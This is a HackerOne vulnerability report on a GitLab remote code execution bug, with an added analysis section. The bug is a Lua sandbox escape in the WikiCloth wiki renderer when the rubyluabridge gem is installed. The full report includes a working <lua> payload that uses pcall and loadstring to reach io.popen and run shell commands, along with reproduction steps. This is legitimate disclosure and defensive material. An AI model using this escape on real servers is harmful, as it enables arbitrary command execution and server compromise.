# RCE via WikiCloth Lua Extension Sandbox Escape when rubyluabridge Gem Installed

## Metadata
- **Source:** HackerOne
- **Report:** 1401444 | https://hackerone.com/reports/1401444
- **Submitted:** 2021-11-16
- **Reporter:** vakzz
- **Program:** GitLab
- **Bounty:** Not specified in report
- **Severity:** High
- **Vuln:** Remote Code Execution, Sandbox Escape, Unsafe Deserialization/Code Execution
- **CVEs:** None
- **Category:** memory-binary

## Summary
GitLab's WikiCloth markdown renderer supports Lua code execution via the `<lua>` tag when the `rubyluabridge` gem is installed. The Lua sandbox implementation is vulnerable to a well-documented bypass technique that allows attackers to escape the sandbox and execute arbitrary system commands. An authenticated user with wiki page creation/editing permissions can exploit this to achieve remote code execution on the GitLab server.

## Attack scenario
1. Attacker installs or ensures rubyluabridge gem is available in GitLab environment (through apt, bundler, or shared Ruby environment)
2. Attacker creates or gains access to a project with wiki permissions
3. Attacker creates a new wiki page or edits an existing one
4. Attacker embeds malicious Lua code using the documented sandbox escape technique via `<lua>` tags
5. Attacker commits and pushes the wiki page changes
6. WikiCloth renderer processes the page, executes the escaped Lua code, and attacker gains arbitrary command execution as the GitLab process user

## Root cause
WikiCloth's Lua sandbox implementation uses a flawed approach to restrict loadstring functionality. It reassigns loadstring to a wrapper function but fails to prevent pcall() from accessing the original loadstring via closure, allowing bypassing of the setfenv restriction. This is a known and documented Lua sandboxing weakness that WikiCloth did not properly account for.

## Attacker mindset
An attacker would recognize that: (1) the rubyluabridge gem is an optional dependency unlikely to be installed by default, making this a low-probability but high-impact vulnerability; (2) the Lua sandbox escape is trivial and well-documented on public Lua security resources; (3) wiki editing is a common permission level that might be granted to contributors; (4) once RCE is achieved, full server compromise is possible depending on GitLab process privileges.

## Defensive takeaways
- Disable dangerous extensions by default rather than enabling them conditionally based on optional gem availability
- Never rely on Lua setfenv() for security boundaries - it is fundamentally bypassable
- If Lua execution is necessary, use proper process isolation (containers, separate processes with restricted permissions) rather than language-level sandboxing
- Audit all WikiCloth extensions for similar sandbox escape patterns
- Implement allowlisting of enabled markup extensions rather than auto-detection
- Consider removing Lua rendering support entirely if it provides minimal user value
- Monitor for unexpected system command execution from wiki rendering processes

## Variant hunting
Look for: (1) other WikiCloth extensions that execute code (JavaScript, Python, etc.) and audit their sandboxing; (2) similar conditional gem loading patterns elsewhere in GitLab that could enable dangerous features; (3) other Ruby markdown libraries that support code execution; (4) instances where setfenv() or similar language-level isolation is used for security purposes; (5) other dependencies on rubyluabridge that might indirectly enable this vulnerability

## MITRE ATT&CK
- T1190 - Exploit Public-Facing Application
- T1203 - Exploitation for Client Execution
- T1059 - Command and Scripting Interpreter (Lua)
- T1069 - Permission Groups Discovery
- T1106 - Native API

## Notes
The vulnerability has a high barrier to entry due to the need for rubyluabridge to be installed, but once present, exploitation is trivial. The reporter correctly identifies that this is an unlikely but severe scenario. The fix approach suggested (disable extensions by default) is sound. The vulnerability demonstrates the danger of auto-loading optional features based on gem availability without explicit user intent or security review.

## Full report
<details><summary>Expand</summary>

### Summary

One of the supported wiki formats is `mediawiki` which is rendered by `WikiCloth` via GitLab Markup:

https://gitlab.com/gitlab-org/gitlab-markup/-/blob/v1.7.1/lib/github/markups.rb#L24-28
```ruby
markup(:wikicloth, /mediawiki|wiki/) do |content|
  wikicloth = WikiCloth::WikiCloth.new(:data => content)
  WikiCloth::WikiBuffer::HTMLElement::ESCAPED_TAGS << 'tt'
  wikicloth.to_html(:noedit => true)
end
```

One of the extensions that `WikiCloth` has is for lua (eg [lua.wiki](https://github.com/nricciar/wikicloth/blob/v0.8.1/sample_documents/lua.wiki)), which allows lua code to be run and the results rendered inside of the page by using either `{{#luaexpr:lua expression}}` or `<lua>lua code here</lua>`. This extension is enabled if the `rubyluabridge` gem can be required:

https://github.com/nricciar/wikicloth/blob/v0.8.1/lib/wikicloth/extensions/lua.rb#L1-L6
```ruby
begin
  require 'rubyluabridge'
  DISABLE_LUA = false
rescue LoadError
  DISABLE_LUA = true
end
```

The lua code is meant to be executed in a sandbox, but looking at the [lua wiki on sandboxing](http://lua-users.org/wiki/SandBoxes#:~:text=loadstring%20--%20UNSAFE.%20See%20load.%20Even%20this%3A) one of the things mentioned is:

> loadstring -- UNSAFE. See load. Even this isn't safe. For example, `pcall(safeloadstring, some_script)` will load some_script in global environment. --SergeyRozhenko

```lua
local oldloadstring = loadstring
local function safeloadstring(s, chunkname)
  local f, message = oldloadstring(s, chunkname)
  if not f then
    return f, message
  end
  setfenv(f, getfenv(2))
  return f
end
```

This is the exact code that `WikiCloth` is using in their wrapper https://github.com/nricciar/wikicloth/blob/master/lib/wikicloth/extensions/lua/luawrapper.lua#L83-L92, so the provided bypass can be used to execute arbitrary lua:

```
<lua>
_,execute = pcall(loadstring,
    [[
        local command = ...;
        local handle = io.popen(command)
        local result = handle:read("*a")
        handle:close()
        return result;
    ]]
);

print(execute('id'));
execute('echo vakzz > /tmp/ggg');
</lua>
```

Luckily it's pretty unlikely that the `rubyluabridge` gem will be installed. There is a current ubuntu package https://packages.ubuntu.com/bionic/ruby/ruby-luabridge that can just be installed with apt, or a rubygem version at https://rubygems.org/gems/Tamar. Potentially another gem could start depending on it, or if gitlab is [installed from source](https://docs.gitlab.com/ee/install/installation.html) and the ruby environment is shared, the apt version could be present.

### Steps to reproduce

1. Install the `rubyluabridge` gem
  * If using the omnibus edition then you will need to do something like the following to get it in the correct spot:
```
curl -sSL https://get.rvm.io | bash
source /etc/profile.d/rvm.sh
rvm install 2.7.4

git clone https://github.com/neomantra/rubyluabridge
sudo apt install liblua5.1-0-dev libboost-dev
./build/extconf_ubuntu.sh
make

sudo cp rubyluabridge.so /opt/gitlab/embedded/lib/ruby/2.7.0/rubyluabridge.so
```
2. Create a new project and add a wiki page
3. Clone the wiki (clone url should end in `.wiki.git`)
4. Create a file `hello.wiki` with the following contents:
```
<lua>
_,execute = pcall(loadstring,
    [[
        local command = ...;
        local handle = io.popen(command)
        local result = handle:read("*a")
        handle:close()
        return result;
    ]]
);

print(execute('id'));
execute('echo vakzz > /tmp/ggg');
</lua>
```
5. Add, commit and push the file
6. Visit the new wiki page on gitlab, you should see the output of the `id` command
7. See that the file `/tmp/ggg` has been created

{F1515535}

### Impact
If the `rubyluabridge` gem has been manually installed, or if another gem starts depending on it, a user with the ability to add wiki pages can run arbitrary commands on the gitlab server 

### What is the current *bug* behavior?
The lua sandbox can be escaped using code from the official wiki.

### What is the expected *correct* behavior?
Probably all of the WikiCloth extensions should be disabled unless explicitly enabled, I cant really see a need for executing lua when rendering a wiki page.

### Output of checks
#### Results of GitLab environment info

## Impact

If the `rubyluabridge` gem has been manually installed, or if another gem starts depending on it, a user with the ability to add wiki pages can run arbitrary commands on the gitlab server

</details>

---
*Analysed by Claude on 2026-05-11*
